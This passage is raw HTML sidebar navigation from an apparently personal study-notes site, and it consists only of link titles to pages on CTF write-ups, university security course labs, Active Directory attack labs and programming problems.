href=/docs/leetcode/easy/leetcode---valid-parentheses/>LeetCode - Valid Parentheses</a></li><li><a href=/docs/terminology/linux-related/>Linux Related</a></li><li><a href=/docs/survey-papers/federated-learning/local-model-poisoning-attacks-to-byzantine-robust-federated-learning---notes/>Local Model Poisoning Attacks to Byzantine-Robust Federated Learning - Notes</a></li><li><a href=/docs/security/course/ntu-ml/machine-learning-hand-write-homework--answer/>Machine Learning Hand-write Homework & Answer</a></li><li><a href=/docs/terminology/math-related/>Math Related</a></li><li><a href=/docs/tools/others/android-app-crawler/maxim/>Maxim</a></li><li><a href=/docs/tools/ctf/misc-cheat-sheet/>Misc Cheat Sheet</a></li><li><a href=/docs/problem-solutions/mitmproxy%E7%9B%B8%E9%97%9C%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/>MITMProxy相關問題整理</a></li><li><a href=/docs/terminology/network-related/>Network Related</a></li><li><a href=/docs/security/practice/nisra/web/nisra---different-places/>NISRA - different places</a></li><li><a href=/docs/security/practice/nisra/misc/nisra---hidden_/>NISRA - Hidden?</a></li><li><a href=/docs/security/practice/nisra/web/nisra---md5_1/>NISRA - MD5_1</a></li><li><a href=/docs/security/practice/nisra/web/nisra---md5_2/>NISRA - MD5_2</a></li><li><a href=/docs/security/practice/nisra/misc/nisra-2023-enlightened---jack%E7%9A%84flag/>NISRA 2023 Enlightened - Jack的flag</a></li><li><a href=/docs/security/practice/nisra/misc/nisra-2023-enlightened---magic-function/>NISRA 2023 Enlightened - Magic Function</a></li><li><a href=/docs/security/practice/nisra/misc/nisra-2023-enlightened---pixel/>NISRA 2023 Enlightened - Pixel</a></li><li><a href=/docs/terminology/node-related/>Node Related</a></li><li><a href=/docs/security/course/ntu-cns/ntu-cns-final-project-proposal/>NTU CNS Final Project Proposal</a></li><li><a href=/docs/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2019-spring/>NTU Compiler Technology Previous Exam 2019 Spring</a></li><li><a href=/docs/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2020-spring/>NTU Compiler Technology Previous Exam 2020 Spring</a></li><li><a href=/docs/security/course/ntu-ct/ntu-compiler-technology-project-1/>NTU Compiler Technology Project 1</a></li><li><a href=/docs/security/course/ntu-ct/ntu-compiler-technology-project-2/>NTU Compiler Technology Project 2</a></li><li><a href=/docs/security/course/ntu-ct/ntu-compiler-technology-project-3/>NTU Compiler Technology Project 3</a></li><li><a href=/docs/security/course/ntu-ct/ntu-compiler-technology-project-4/>NTU Compiler Technology Project 4</a></li><li><a href=/docs/security/course/ntu-cs/crypto/ntu-cs-2023-hw1-write-up/>NTU CS 2023 HW1 Write Up</a></li><li><a href=/docs/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/>NTU CS 2023 HW2 Write Up</a></li><li><a href=/docs/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/>NTU CS 2023 HW3 Write Up</a></li><li><a href=/docs/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/>NTU CS 2023 HW4 Write Up</a></li><li><a href=/docs/security/course/ntu-cs/welcome/ntu-cs-hw0-write-up/>NTU CS HW0 Write Up</a></li><li><a href=/docs/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes-1/>NTU Machine Learning Final Project Proposal Notes</a></li><li><a href=/docs/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes/>NTU Machine Learning Final Project Proposal Notes</a></li><li><a href=/docs/security/course/ntu-ml/ntu-machine-learning-homework-1/>NTU Machine Learning Homework 1</a></li><li><a href=/docs/security/course/ntu-ml/ntu-machine-learning-homework-2/>NTU Machine Learning Homework 2</a></li><li><a href=/docs/security/course/ntu-mr/ntu-malware-reverse-final-project-notes/>NTU Malware Reverse Final Project Notes</a></li><li><a href=/docs/security/course/ntu-mr/ntu-malware-reverse-hw-1-write-up/>NTU Malware Reverse HW 1 write up</a></li><li><a href=/docs/security/course/ntu-mr/ntu-malware-reverse-hw-2-write-up/>NTU Malware Reverse HW 2 write up</a></li><li><a href=/docs/security/course/ntu-mr/ntu-malware-reverse-hw-3-write-up/>NTU Malware Reverse HW 3 write up</a></li><li><a href=/docs/security/course/ntu-mr/ntu-malware-reverse-lab-1-write-up/>NTU Malware Reverse Lab 1 write up</a></li><li><a href=/docs/security/course/ntu-mr/ntu-malware-reverse-lab-2-write-up/>NTU Malware Reverse Lab 2 write up</a></li><li><a href=/docs/security/course/ntu-mr/ntu-malware-reverse-lab-3-write-up/>NTU Malware Reverse Lab 3 write up</a></li><li><a href=/docs/security/course/ntu-os/ntu-operating-system-project-1/>NTU Operating System Project 1</a></li><li><a href=/docs/security/course/ntu-os/ntu-operating-system-project-2/>NTU Operating System Project 2</a></li><li><a href=/docs/security/course/ntu-os/ntu-operating-system-project-3/>NTU Operating System Project 3</a></li><li><a href=/docs/security/course/ntu-os/ntu-operating-system-review-notes/>NTU Operating System Review Notes</a></li><li><a href=/docs/security/course/ntu-st/ntu-software-testing-notes-1/>NTU Software Testing Notes</a></li><li><a href=/docs/security/course/ntu-st/ntu-software-testing-notes/>NTU Software Testing Notes</a></li><li><a href=/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x21as-rep-roasting/>NTUSTISC - AD Note - Lab(AS-REP Roasting)</a></li><li><a href=/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/>NTUSTISC - AD Note - Lab(Brute Force SAM)</a></li><li><a href=/docs/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x10hijack-token/>NTUSTISC - AD Note - Lab(Hijack Token)</a></li><li><a href=/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x04leak-password/>NTUSTISC - AD Note - Lab(Leak Password)</a></li><li><a href=/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x14password-spraying/>NTUSTISC - AD Note - Lab(Password Spraying)</a></li><li><a href=/docs/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x24smb%E9%81%A0%E7%AB%AF%E8%AE%80%E5%AF%AB/>NTUSTISC - AD Note - Lab(SMB遠端讀寫)</a></li><li><a href=/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x17%E5%81%B5%E6%B8%AClsass/>NTUSTISC - AD Note - Lab(偵測LSASS)</a></li><li><a href=/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x15%E5%81%B5%E6%B8%AC%E5%AF%86%E7%A2%BC%E6%8F%AE%E7%81%91/>NTUSTISC - AD Note - Lab(偵測密碼揮灑)</a></li><li><a href=/docs/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x11%E5%81%B5%E6%B8%AC%E6%8F%90%E6%AC%8A/>NTUSTISC - AD Note - Lab(偵測提權)</a></li><li><a href=/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x05%E5%81%B5%E6%B8%AC%E6%9F%A5%E8%A9%A2%E7%9A%84%E6%93%8D%E4%BD%9C/>NTUSTISC - AD Note - Lab(偵測查詢的操作)</a></li><li><a href=/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x18%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95%E5%BE%97%E5%88%B0lsass.dmp/>NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp)</a></li><li><a href=/docs/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x09%E5%88%A9%E7%94%A8%E5%BC%B1%E9%BB%9E/>NTUSTISC - AD Note - Lab(利用弱點)</a></li><li><a href=/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x02%E6%9F%A5%E8%A9%A2%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E8%80%85/>NTUSTISC - AD Note - Lab(查詢本地使用者)</a></li><li><a href=/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x06%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E7%BE%A4%E7%B5%84/>NTUSTISC - AD Note - Lab(查詢網域群組)</a></li><li><a href=/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x20%E7%84%A1%E6%B3%95reboot%E7%9A%84%E6%99%82%E7%9B%9C%E5%8F%96passwd/>NTUSTISC - AD Note - Lab(無法Reboot的時盜取Passwd)</a></li><li><a href=/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x08%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5bloodhound/>NTUSTISC - AD Note - Lab(環境調查BloodHound)</a></li><li><a href=/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x07%E7%95%B6%E5%89%8D%E7%B6%B2%E5%9F%9F%E6%8E%A7%E5%88%B6%E7%AB%99dc/>NTUSTISC - AD Note - Lab(當前網域控制站(DC))</a></li><li><a href=/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x16%E9%80%8F%E9%81%8Emimikatz%E5%8F%96%E5%BE%97local-admin%E7%9A%84ntlm/>NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM)</a></li><li><a href=/docs/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x22%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp/>NTUSTISC - AD Note - Lab(遠端執行(RDP))</a></li><li><a href=/docs/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x23%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp2/>NTUSTISC - AD Note - Lab(遠端執行(RDP)2)</a></li><li><a href=/docs/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x12%E9%8C%AF%E8%AA%A4%E9%85%8D%E7%BD%AE/>NTUSTISC - AD Note - Lab(錯誤配置)</a></li><li><a href=/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x19%E9%A1%AF%E7%A4%BAmimikatz%E7%9A%84%E6%98%8E%E6%96%87/>NTUSTISC - AD Note - Lab(顯示Mimikatz的明文)</a></li><li><a href=/docs/security/course/ntust-isc/ad/ntustisc---ad-note---%E6%9C%83%E5%BE%8C%E6%8F%90%E5%8F%8A%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/>NTUSTISC - AD Note - 會後提及有用的工具</a></li><li><a href=/docs/security/course/ntust-isc/ad/ntustisc---ad-note---0x01%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE--background/>NTUSTISC - AD Note - 環境建置 & Background</a></li><li><a href=/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x03%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E4%BD%BF%E7%94%A8%E8%80%85/>NTUSTISC - AD Note(Lab - 查詢網域使用者)</a></li><li><a href=/docs/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-1/>NTUSTISC - CyberDefender - MrRobot - Target 1</a></li><li><a href=/docs/survey-papers/android-+-security/tool/pentest-tools-survey/>Pentest Tools Survey</a></li><li><a href=/docs/security/practice/picoctf/misc/image-stego/picoctf---tunn3l-v1s10n/>PicoCTF - `tunn3l v1s10n`</a></li><li><a href=/docs/security/practice/picoctf/misc/flow/picoctf---wireshark-doo-dooo-do-doo.../>PicoCTF - `Wireshark doo dooo do doo...`</a></li><li><a href=/docs/security/practice/picoctf/misc/image-stego/picoctf---advanced-potion-making/>PicoCTF - advanced-potion-making</a></li><li><a href=/docs/security/practice/picoctf/crypto/des-aes/picoctf---aes-abc/>PicoCTF - AES-ABC</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---armssembly-0/>PicoCTF - ARMssembly 0</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---asm4/>PicoCTF - asm4</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---babygame01/>PicoCTF - babygame01</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---babygame02/>PicoCTF - babygame02</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/>PicoCTF - buffer overflow 2</a></li><li><a href=/docs/security/practice/picoctf/misc/image-stego/picoctf---c0rrupt/>PicoCTF - c0rrupt</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---caas/>PicoCTF - caas</a></li><li><a href=/docs/security/practice/picoctf/crypto/picoctf---compress-and-attack/>PicoCTF - Compress and Attack</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---cookies/>PicoCTF - Cookies</a></li><li><a href=/docs/security/practice/picoctf/crypto/rsa/picoctf---corrupt-key-1/>PicoCTF - corrupt-key-1</a></li><li><a href=/docs/security/practice/picoctf/crypto/rsa/picoctf---dachshund-attacks/>PicoCTF - Dachshund Attacks</a></li><li><a href=/docs/security/practice/picoctf/misc/disk/picoctf---disk-disk-sleuth-ii/>PicoCTF - Disk, disk, sleuth! II</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---dont-use-client-side/>PicoCTF - dont-use-client-side</a></li><li><a href=/docs/security/practice/picoctf/crypto/des-aes/picoctf---double-des/>PicoCTF - Double DES</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---droids1/>PicoCTF - droids1</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---droids3/>PicoCTF - droids3</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---droids4/>PicoCTF - droids4</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---easy-as-gdb/>PicoCTF - Easy as GDB</a></li><li><a href=/docs/security/practice/picoctf/crypto/classic/picoctf---easy-peasy/>PicoCTF - Easy Peasy</a></li><li><a href=/docs/security/practice/picoctf/bad-questions/picoctf---easy-peasy-or-bad-questions/>PicoCTF - Easy Peasy Or Bad Questions</a></li><li><a href=/docs/security/practice/picoctf/misc/flow/picoctf---eavesdrop/>PicoCTF - Eavesdrop</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---fermat-strings/>PicoCTF - fermat-strings</a></li><li><a href=/docs/security/practice/picoctf/misc/general/picoctf---file-types/>PicoCTF - File types</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---filtered-shellcode/>PicoCTF - filtered-shellcode</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---flag-leak/>PicoCTF - flag leak</a></li><li><a href=/docs/security/practice/picoctf/general-skills/picoctf---flag_shop/>PicoCTF - flag_shop</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---forky/>PicoCTF - Forky</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---function-overwrite/>PicoCTF - function overwrite</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---gogo/>PicoCTF - gogo</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---guessing-game-1/>PicoCTF - Guessing Game 1</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---guessing-game-2/>PicoCTF - Guessing Game 2</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---hijacking/>PicoCTF - hijacking</a></li><li><a href=/docs/security/practice/picoctf/misc/picoctf---information/>PicoCTF - information</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---insp3ct0r/>PicoCTF - Insp3ct0r</a></li><li><a href=/docs/security/practice/picoctf/misc/general/picoctf---investigative-reversing-0/>PicoCTF - Investigative Reversing 0</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---it-is-my-birthday/>PicoCTF - It is my Birthday</a></li><li><a href=/docs/security/practice/picoctf/crypto/rsa/picoctf---its-not-my-fault-1/>PicoCTF - It's Not My Fault 1</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---jauth/>PicoCTF - JAUTH</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---java-code-analysis_/>PicoCTF - Java Code Analysis!?!</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---java-script-kiddie/>PicoCTF - Java Script Kiddie</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---jawt-scratchpad/>PicoCTF - JaWT Scratchpad</a></li><li><a href=/docs/security/practice/picoctf/crypto/rsa/picoctf---john_pollard/>PicoCTF - john_pollard</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---kit-engine/>PicoCTF - Kit Engine</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---lets-get-dynamic/>PicoCTF - Let's get dynamic</a></li><li><a href=/docs/security/practice/picoctf/misc/general/picoctf---like1000/>PicoCTF - like1000</a></li><li><a href=/docs/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk/>PicoCTF - m00nwalk</a></li><li><a href=/docs/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk2/>PicoCTF - m00nwalk2</a></li><li><a href=/docs/security/practice/picoctf/misc/general/picoctf---macrohard-weakedge/>PicoCTF - MacroHard WeakEdge</a></li><li><a href=/docs/security/practice/picoctf/misc/general/picoctf---matryoshka-doll/>PicoCTF - Matryoshka doll</a></li><li><a href=/docs/security/practice/picoctf/crypto/rsa/picoctf---mind-your-ps-and-qs/>PicoCTF - Mind your Ps and Qs</a></li><li><a href=/docs/security/practice/picoctf/crypto/rsa/picoctf---mini-rsa/>PicoCTF - Mini RSA</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---more-sqli/>PicoCTF - More SQLi</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---most-cookies/>PicoCTF - Most Cookies</a></li><li><a href=/docs/security/practice/picoctf/general-skills/picoctf---mus1c/>PicoCTF - mus1c</a></li><li><a href=/docs/security/practice/picoctf/crypto/classic/picoctf---new-caesar/>PicoCTF - New Caesar</a></li><li><a href=/docs/security/practice/picoctf/crypto/rsa/picoctf---no-padding-no-problem/>PicoCTF - No Padding, No Problem</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---no-way-out/>PicoCTF - No way out</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---not-crypto/>PicoCTF - not crypto</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---notepad/>PicoCTF - notepad</a></li><li><a href=/docs/security/practice/picoctf/crypto/rsa/picoctf---nsa-backdoor/>PicoCTF - NSA Backdoor</a></li><li><a href=/docs/security/practice/picoctf/misc/disk/picoctf---operation-oni/>PicoCTF - Operation Oni</a></li><li><a href=/docs/security/practice/picoctf/misc/disk/picoctf---operation-orchid/>PicoCTF - Operation Orchid</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---otp-implementation/>PicoCTF - OTP Implementation</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---picker-iii/>PicoCTF - Picker III</a></li><li><a href=/docs/security/practice/picoctf/misc/disk/picoctf---pitter-patter-platters/>PicoCTF - Pitter, Patter, Platters</a></li><li><a href=/docs/security/practice/picoctf/crypto/sidechannel/picoctf---poweranalysis-part-1-_-part-2/>PicoCTF - PowerAnalysis Part 1 / Part 2</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---powershelly/>PicoCTF - Powershelly</a></li><li><a href=/docs/security/practice/picoctf/general-skills/picoctf---pw-crack-4/>PicoCTF - PW Crack 4</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---ropfu/>PicoCTF - ropfu</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---rps/>PicoCTF - RPS</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---saas/>PicoCTF - SaaS</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---scavenger-hunt/>PicoCTF - Scavenger Hunt</a></li><li><a href=/docs/security/practice/picoctf/misc/flow/picoctf---scrambled-bytes/>PicoCTF - scrambled-bytes</a></li><li><a href=/docs/security/practice/picoctf/crypto/rsa/picoctf---scrambled_-rsa/>PicoCTF - Scrambled: RSA</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---secrets/>PicoCTF - Secrets</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---seed-spring/>PicoCTF - seed-sPRiNG</a></li><li><a href=/docs/security/practice/picoctf/crypto/classic/picoctf---sequences/>PicoCTF - Sequences</a></li><li><a href=/docs/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-1/>PicoCTF - shark on wire 1</a></li><li><a href=/docs/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-2/>PicoCTF - shark on wire 2</a></li><li><a href=/docs/security/practice/picoctf/misc/general/picoctf---sidechannel/>PicoCTF - SideChannel</a></li><li><a href=/docs/security/practice/picoctf/misc/disk/picoctf---sleuthkit-intro/>PicoCTF - Sleuthkit Intro</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---some-assembly-required-1/>PicoCTF - Some Assembly Required 1</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---some-assembly-required-2/>PicoCTF - Some Assembly Required 2</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---some-assembly-required-3/>PicoCTF - Some Assembly Required 3</a></li><li><a href=/docs/security/practice/picoctf/general-skills/picoctf---special--specialer/>PicoCTF - Special & Specialer</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---sqlilite/>PicoCTF - SQLiLite</a></li><li><a href=/docs/security/practice/picoctf/crypto/rsa/picoctf---sra/>PicoCTF - SRA</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---stack-cache/>PicoCTF - stack cache</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---stonk-market/>PicoCTF - Stonk Market</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---super-serial/>PicoCTF - Super Serial</a></li><li><a href=/docs/security/practice/picoctf/misc/audio/picoctf---surfing-the-waves/>PicoCTF - Surfing the Waves</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---tic-tac/>PicoCTF - tic-tac</a></li><li><a href=/docs/security/practice/picoctf/misc/flow/picoctf---torrent-analyze/>PicoCTF - Torrent Analyze</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---transformation/>PicoCTF - Transformation</a></li><li><a href=/docs/security/practice/picoctf/misc/flow/picoctf---trivial-flag-transfer-protocol/>PicoCTF - Trivial Flag Transfer Protocol</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---two-sum/>PicoCTF - two-sum</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/>PicoCTF - Unsubscriptions Are Free</a></li><li><a href=/docs/security/practice/picoctf/crypto/rsa/picoctf---very-smooth/>PicoCTF - Very Smooth</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---vne/>PicoCTF - VNE</a></li><li><a href=/docs/security/practice/picoctf/misc/flow/picoctf---webnet0/>PicoCTF - WebNet0</a></li><li><a href=/docs/security/practice/picoctf/misc/general/picoctf---whitepages/>PicoCTF - WhitePages</a></li><li><a href=/docs/security/practice/picoctf/web/picoctf---who-are-you_/>PicoCTF - Who are you?</a></li><li><a href=/docs/security/practice/picoctf/misc/flow/picoctf---wireshark-twoo-twooo-two-twoo_/>PicoCTF - Wireshark twoo twooo two twoo...</a></li><li><a href=/docs/security/practice/picoctf/reverse/picoctf---wizardlike/>PicoCTF - Wizardlike</a></li><li><a href=/docs/security/practice/picoctf/misc/flow/picoctf---wpa-ing-out/>PicoCTF - WPA-ing Out</a></li><li><a href=/docs/security/practice/picoctf/pwn/picoctf---x-sixty-what/>PicoCTF - x-sixty-what</a></li><li><a href=/docs/security/practice/picoctf/crypto/classic/picoctf---xtraordinary/>PicoCTF - XtraORdinary</a></li><li><a href=/docs/security/competition/picoctf-2023/>PicoCTF 2023</a></li><li><a href=/docs/problem-solutions/problems-about-multiprocess/>Problems About Multiprocess</a></li><li><a href=/docs/terminology/programming-related/>Programming Related</a></li><li><a href=/docs/tools/ctf/pwn-overview/>PWN Overview</a></li><li><a href=/docs/problem-solutions/pwndbg-installation-problems/>pwndbg installation problems</a></li><li><a href=/docs/problem-solutions/react-native---error-resolving-plugin-id_-com.facebook.react.settings/>React Native - Error resolving plugin [id: 'com.facebook.react.settings']</a></li><li><a href=/docs/tools/others/real-world-tools/>Real World Tools</a></li><li><a href=/docs/terminology/reinforcement-learning/>Reinforcement Learning</a></li><li><a href=/docs/tools/ctf/reverse-overview/>Reverse Overview</a></li><li><a href=/docs/side-project/side_project_lightbulb_control/>side_project_lightbulb_control</a></li><li><a href=/docs/side-project/side_project_weibo_hot/>side_project_weibo_hot</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/>Simple Buffer Overflow - 0x00</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/>Simple Buffer Overflow - 0x01</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/>Simple Buffer Overflow - 0x02</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/>Simple Buffer Overflow - 0x04</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/>Simple Buffer Overflow - 0x05(Leak Canary)</a></li><li><a href=/docs/security/course/ntu-cs/crypto/simple-crypto---0x01modular-operation/>Simple Crypto - 0x01(Modular Operation)</a></li><li><a href=/docs/security/course/ntu-cs/crypto/simple-crypto---0x02random-number-generator---lcg/>Simple Crypto - 0x02(Random Number Generator - LCG)</a></li><li><a href=/docs/security/course/ntu-cs/crypto/simple-crypto---0x032023-lab---cor/>Simple Crypto - 0x03(2023 Lab - COR)</a></li><li><a href=/docs/security/course/ntu-cs/crypto/simple-crypto---0x03lab---lfsr/>Simple Crypto - 0x03(Lab - LFSR)</a></li><li><a href=/docs/security/course/ntu-cs/crypto/simple-crypto---0x042023-lab---poa/>Simple Crypto - 0x04(2023 Lab - POA)</a></li><li><a href=/docs/security/course/ntu-cs/crypto/simple-crypto---0x052023-lab---lsb/>Simple Crypto - 0x05(2023 Lab - LSB)</a></li><li><a href=/docs/security/course/ntu-cs/crypto/simple-crypto---0x062023-hw---lfsr/>Simple Crypto - 0x06(2023 HW - LFSR)</a></li><li><a href=/docs/security/course/ntu-cs/crypto/simple-crypto---0x072023-hw---oracle/>Simple Crypto - 0x07(2023 HW - Oracle)</a></li><li><a href=/docs/security/course/ntu-cs/crypto/simple-crypto---0x082023-lab---dlog/>Simple Crypto - 0x08(2023 Lab - dlog)</a></li><li><a href=/docs/security/course/ntu-cs/crypto/simple-crypto---0x092023-lab---signature/>Simple Crypto - 0x09(2023 Lab - signature)</a></li><li><a href=/docs/security/course/ntu-cs/crypto/simple-crypto---0x102023-lab---coppersmith/>Simple Crypto - 0x10(2023 Lab - coppersmith)</a></li><li><a href=/docs/security/course/ntu-cs/crypto/simple-crypto-0x112023-hw---invalid_curve_attack/>Simple Crypto 0x11(2023 HW - invalid_curve_attack)</a></li><li><a href=/docs/security/course/ntu-cs/crypto/simple-crypto-0x122023-hw---signature_revenge/>Simple Crypto 0x12(2023 HW - signature_revenge)</a></li><li><a href=/docs/security/course/ntu-cs/crypto/simple-crypto-0x132023-hw---power-analysis/>Simple Crypto 0x13(2023 HW - Power Analysis)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/>Simple PWN - 0x06(GOT hijacking/Lab - `got2win`)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn---0x07rop/>Simple PWN - 0x07(ROP)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/>Simple PWN - 0x08(one_gadget with ROP)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/>Simple PWN - 0x09(stack pivoting)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/>Simple PWN - 0x10(`seccomp`/Lab - `rop2win`)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/>Simple PWN - 0x11(format string bug)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/>Simple PWN - 0x12(Lab - `rop++`)</a></li><li><a 